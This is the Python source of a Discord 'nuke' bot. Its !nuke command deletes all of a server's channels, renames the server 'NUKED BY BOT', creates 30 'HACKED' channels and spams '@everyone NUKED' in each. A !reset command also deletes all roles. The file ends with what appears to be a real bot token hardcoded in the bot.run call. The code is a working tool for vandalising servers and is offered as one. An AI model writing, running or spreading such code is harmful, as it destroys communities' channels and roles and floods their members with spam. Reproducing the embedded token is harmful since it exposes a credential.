import discord
from discord.ext import commands
import asyncio
import random

SERVER_NAME = 'NUKED BY BOT'
CHANNEL_PREFIX = 'HACKED'
USE_RANDOM_EMOJIS = True
EMOJIS_LIST = ['👹', '💀', '🔥', '⚡', '💥', '🗿', '😈', '👿', '🤡', '🎭', '👻', '☠️', '💣', '🔪', '🩸']
MESSAGE_TEXT = '@everyone NUKED'
NUM_MESSAGES_PER_CHANNEL = 5
DELETE_DELAY = 0.8
CREATE_DELAY = 0.8
NUM_CHANNELS = 30
SEND_DELAY = 0.1
DELETE_BATCH_SIZE = 20
CREATE_BATCH_SIZE = 30


intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
async def nuke(guild):
    channels_to_delete = list(guild.channels)
    for i in range(0, len(channels_to_delete), DELETE_BATCH_SIZE):
        batch = channels_to_delete[i:i+DELETE_BATCH_SIZE]
        channel_deletes = [channel.delete() for channel in batch]
        channel_results = await asyncio.gather(*channel_deletes, return_exceptions=True)
        for channel, result in zip(batch, channel_results):
            if isinstance(result, Exception):
                print(f'Error deleting channel {channel.name}: {result}')
            else:
                print(f'Deleted channel {channel.name}')
        await asyncio.sleep(DELETE_DELAY)
async def rename_discord(guild):
    await guild.edit(name=SERVER_NAME)
async def spam_nuked(guild):
    text_channels = list(guild.text_channels)
    tasks = []
    for channel in text_channels:
        for _ in range(NUM_MESSAGES_PER_CHANNEL):
            tasks.append(channel.send(MESSAGE_TEXT))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for k, result in enumerate(results):
        if isinstance(result, Exception):
            print(f'Error sending message {k}: {result}')
    return results
async def create_nuked_content(guild):
    for i in range(0, NUM_CHANNELS, CREATE_BATCH_SIZE):
        tasks = []
        for j in range(i, min(i + CREATE_BATCH_SIZE, NUM_CHANNELS)):
            name = CHANNEL_PREFIX
            if USE_RANDOM_EMOJIS:
                num_emojis = random.randint(1, 3)
                selected_emojis = ''.join(random.choice(EMOJIS_LIST) for _ in range(num_emojis))
                name += f' {selected_emojis}'
            tasks.append(guild.create_text_channel(name))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for k, result in enumerate(results):
            if isinstance(result, Exception):
                print(f'Error creating channel {k}: {result}')
        await asyncio.sleep(CREATE_DELAY)
@bot.command(name='reset')
async def _reset(ctx):
    guild = ctx.guild
    await nuke(guild)
    roles_to_delete = [role for role in guild.roles if not role.is_default()]
    for i in range(0, len(roles_to_delete), DELETE_BATCH_SIZE):
        batch = roles_to_delete[i:i+DELETE_BATCH_SIZE]
        role_deletes = [role.delete() for role in batch]
        role_results = await asyncio.gather(*role_deletes, return_exceptions=True)
        for role, result in zip(batch, role_results):
            if isinstance(result, Exception):
                print(f'Error deleting role {role.name}: {result}')
            else:
                print(f'Deleted role {role.name}')
        await asyncio.sleep(DELETE_DELAY)
    await guild.edit(name="Rebuilt")
    try:
        await guild.create_text_channel('general')
        await guild.create_voice_channel('General')
        print('Created basic channels: #general and General voice')
    except Exception as e:
        print(f'Error creating basic channels: {e}')
    print(f'Server reset to default with name "Rebuilt"')
@bot.command(name='nuke')
async def _nuke(ctx):
    guild = ctx.guild
    await nuke(guild)
    await rename_discord(guild)
    await nuke(guild)
    await create_nuked_content(guild)
    messages = await spam_nuked(guild)
bot.run('MTQ2NDI5NTExNjYxNjUwMzM1OQ.GnKTAk.QjfWulV9C86MZ49A2m0AFUmaLEPUAWaApsgxr0')